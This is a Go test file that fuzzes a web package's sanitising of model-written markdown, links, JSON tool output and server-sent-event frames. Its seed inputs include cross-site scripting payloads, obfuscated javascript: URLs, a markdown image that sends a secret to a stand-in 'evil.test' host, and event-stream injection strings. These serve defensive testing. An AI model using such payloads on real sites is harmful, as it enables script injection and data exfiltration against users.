package web

import (
	"html"
	"net/http/httptest"
	"slices"
	"strconv"
	"strings"
	"testing"
)

// browserScheme is the scheme a browser would act on for an href, per the WHATWG URL parser: leading and trailing C0 controls and spaces stripped, tabs and newlines removed anywhere, then an ASCII-alpha-led run before a colon. "" means relative.
//
//nolint:cyclop // the WHATWG scheme-state rules, one branch each
func browserScheme(href string) string {
	href = strings.TrimFunc(href, func(r rune) bool { return r <= ' ' })
	href = strings.Map(func(r rune) rune {
		if r == '\t' || r == '\n' || r == '\r' {
			return -1
		}

		return r
	}, href)

	for i := range len(href) {
		c := href[i]

		switch {
		case c == ':' && i > 0:
			return strings.ToLower(href[:i])
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z':
		case i > 0 && (c >= '0' && c <= '9' || c == '+' || c == '-' || c == '.'):
		default:
			return ""
		}
	}

	return ""
}

var linkableSchemes = []string{"", "http", "https", "mailto"}

// FuzzSafeURL: a link a model wrote either keeps its destination or loses it, and what it keeps is something a browser would navigate to rather than run.
func FuzzSafeURL(f *testing.F) {
	for _, seed := range []string{
		"https://example.com/a?b#c", "/runs/1", "#top", "mailto:a@b.test", "javascript:alert(1)",
		" JaVaScRiPt:alert(1)", "java\tscript:alert(1)", "\x01javascript:alert(1)", "data:text/html,x",
		"vbscript:x", "//evil.test", "/\\evil.test", " javascript:alert(1)", "1javascript:x", "",
	} {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, destination string) {
		got := safeURL(destination)
		if got == "" {
			return
		}

		if got != strings.TrimSpace(destination) {
			t.Fatalf("safeURL(%q) = %q, which rewrote the link rather than keeping or dropping it", destination, got)
		}

		// The href goes out HTML-escaped and a browser unescapes it, so the browser sees got exactly.
		if scheme := browserScheme(html.UnescapeString(html.EscapeString(got))); !slices.Contains(linkableSchemes, scheme) {
			t.Fatalf("safeURL(%q) kept %q, which a browser reads as a %s: link", destination, got, scheme)
		}
	})
}

var markupTags = []string{
	"a", "p", "em", "strong", "code", "pre", "ul", "ol", "li", "blockquote",
	"h1", "h2", "h3", "h4", "h5", "h6", "hr", "br", "table", "thead", "tbody", "tr", "th", "td",
	"del", "input", "span", "div", "details", "summary",
}

// checkMarkup holds rendered HTML to what model-authored text may become: only tags from markupTags, no event handlers or loaders, hrefs a browser navigates rather than runs, and every other '<' or '>' escaped.
func checkMarkup(t *testing.T, input, out string) {
	t.Helper()

	fail := func(why string) {
		t.Helper()
		t.Fatalf("%q rendered to %q: %s", input, out, why)
	}

	for i := 0; i < len(out); i++ {
		switch out[i] {
		case '>':
			fail("a stray '>' at byte " + strconv.Itoa(i))
		case '<':
			if rest, found := strings.CutPrefix(out[i:], "<!-- raw HTML omitted -->"); found {
				i = len(out) - len(rest) - 1

				continue
			}

			i = checkTag(fail, out, i)
		}
	}
}

// checkTag reads one tag starting at out[start] == '<' and returns the index of its closing '>'.
//
//nolint:cyclop,gocognit // a tag lexer: one branch per thing a tag may not carry
func checkTag(fail func(string), out string, start int) int {
	i := start + 1
	if i < len(out) && out[i] == '/' {
		i++
	}

	nameStart := i
	for i < len(out) && (out[i] >= 'a' && out[i] <= 'z' || out[i] >= '0' && out[i] <= '9') {
		i++
	}

	name := out[nameStart:i]
	if !slices.Contains(markupTags, name) {
		fail("a <" + name + "> tag")
	}

	for {
		for i < len(out) && out[i] == ' ' {
			i++
		}

		if i >= len(out) {
			fail("an unterminated tag")
		}

		if out[i] == '>' {
			return i
		}

		if strings.HasPrefix(out[i:], "/>") {
			return i + 1
		}

		attrStart := i
		for i < len(out) && (out[i] >= 'a' && out[i] <= 'z' || out[i] == '-') {
			i++
		}

		attr := out[attrStart:i]
		if attr == "" || !strings.HasPrefix(out[i:], `="`) {
			fail("unparsable markup in <" + name + ">")
		}

		end := strings.IndexByte(out[i+2:], '"')
		if end < 0 {
			fail("an unterminated attribute")
		}

		value := html.UnescapeString(out[i+2 : i+2+end])
		i += end + 3

		switch {
		case strings.HasPrefix(attr, "on"), attr == "src", attr == "srcdoc", attr == "action", attr == "formaction", attr == "srcset":
			fail("a " + attr + "= attribute")
		case attr == "href" && !slices.Contains(linkableSchemes, browserScheme(value)):
			fail("an href a browser would run: " + value)
		case attr == "style" && (strings.Contains(strings.ToLower(value), "url(") || strings.Contains(strings.ToLower(value), "expression")):
			fail("a style that loads something: " + value)
		}
	}
}

// FuzzRenderProse: whatever a model writes, the transcript shows it without it acting on the page.
func FuzzRenderProse(f *testing.F) {
	for _, seed := range []string{
		"## Falsified — dropped\n\n**3 survived** and `x`",
		"<script>alert(1)</script>",
		`<div onclick="steal()">hi</div>`,
		"[click](javascript:alert(1)) [ok](https://x.test) <https://auto.test> <a@b.test>",
		"![exfil](https://evil.test/p?secret=1)",
		"[x](java&#x09;script:alert(1))",
		"```json\n{\"a\": \"<b>\"}\n```\n\n```go\nfunc main() {}\n```\n\n```\"><script>\nx\n```",
		"| a | b |\n|---|---|\n| <i>1</i> | 2 |\n\n- [x] done\n- [ ] todo\n\n~~gone~~",
		"[a]: javascript:alert(1)\n\n[a]",
	} {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, text string) {
		if len(text) > 4096 {
			return
		}

		checkMarkup(t, text, string(renderProse(text)))
	})
}

// FuzzJSONView: a tool's payload renders the same way whether it is a document, a fragment, or not JSON at all — as markup this package built around text it escaped.
func FuzzJSONView(f *testing.F) {
	for _, seed := range []string{
		`{"qty": 60, "name": "<script>alert(1)</script>", "nested": "{\"a\": [1, 2]}"}`,
		`[1, 2.50, 12345678901234567890, true, null, "x\ny"]`,
		`{"a": `,
		`not json <b>`,
		`"just a string"`,
		`{} {}`,
	} {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, raw string) {
		if len(raw) > 4096 {
			return
		}

		checkMarkup(t, raw, string(jsonValue(raw).HTML))
		checkMarkup(t, raw, string(jsonPre(raw)))
		checkMarkup(t, raw, string(jsonLine(raw)))
	})
}

// sseMessages reads a stream the way an EventSource does: CRLF, CR and LF all end a line, a blank line dispatches, and one space after the colon is dropped.
func sseMessages(stream string) (messages []map[string][]string, leftover bool) {
	stream = strings.ReplaceAll(stream, "\r\n", "\n")
	stream = strings.ReplaceAll(stream, "\r", "\n")

	current := map[string][]string{}

	lines := strings.Split(stream, "\n")
	for _, line := range lines[:len(lines)-1] {
		if line == "" {
			messages = append(messages, current)
			current = map[string][]string{}

			continue
		}

		field, value, _ := strings.Cut(line, ":")
		current[field] = append(current[field], strings.TrimPrefix(value, " "))
	}

	return messages, len(current) > 0 || lines[len(lines)-1] != ""
}

// FuzzWriteFrame: one fragment is one unnamed message whose data is the fragment, whatever line endings a task's output put in it — no forged event:, no second message.
func FuzzWriteFrame(f *testing.F) {
	f.Add(int64(7), "<pre>line one\nline two</pre>")
	f.Add(int64(1), "progress\r\revent: done\rdata: 0\r\r")
	f.Add(int64(0), "")
	f.Add(int64(-3), "a\r\n\r\nid: 99\n\nretry: 1")

	f.Fuzz(func(t *testing.T, id int64, fragment string) {
		recorder := httptest.NewRecorder()
		writeFrame(recorder, id, fragment)

		messages, leftover := sseMessages(recorder.Body.String())
		if len(messages) != 1 || leftover {
			t.Fatalf("%q framed as %d messages (leftover %v): %q", fragment, len(messages), leftover, recorder.Body.String())
		}

		message := messages[0]

		for field := range message {
			if field != "id" && field != "data" {
				t.Fatalf("%q framed with a %q field: %q", fragment, field, recorder.Body.String())
			}
		}

		if !slices.Equal(message["id"], []string{strconv.FormatInt(id, 10)}) {
			t.Fatalf("id %d framed as %q", id, message["id"])
		}

		want := strings.ReplaceAll(strings.ReplaceAll(fragment, "\r\n", "\n"), "\r", "\n")
		if got := strings.Join(message["data"], "\n"); got != want {
			t.Fatalf("%q arrives as %q, want %q", fragment, got, want)
		}
	})
}
